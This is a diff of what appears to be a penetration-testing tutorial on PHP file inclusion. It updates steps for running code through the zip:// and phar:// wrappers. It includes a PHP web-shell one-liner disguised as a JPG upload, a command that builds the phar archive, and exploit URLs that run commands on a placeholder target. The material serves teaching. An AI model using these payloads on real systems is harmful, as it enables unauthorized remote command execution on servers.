@@ -21,7 +21,7 @@ echo '<?php system($_GET["cmd"]) ?>' > shell.php && zip shell.jpg shell.php
 ```
 > Note: Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.
 
-Once we have uploaded `shell.jpg`, we can include it with the `zip` wrapper as follows:
+Once we have uploaded `shell.jpg`, we can include it with the `zip://` wrapper as follows:
 ```txt
 http://target-website.com/?language=zip://./images/shell.jpg#shell.php&cmd=id
 ```
@@ -40,4 +40,7 @@ Next we will combine this script into a `phar` file that when called would write
 ```bash
 php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 ```
-Now, we should have a `phar` file called `shell.jpg`, next we uplo
+Once we have uploaded our `phar` file named `shell.jpg`, we will include it with the `phar://` wrapper as follows:
+```txt
+http://target-website.com/?language=phar://./images/shell.jpg/shell.txt&cmd=id
+```
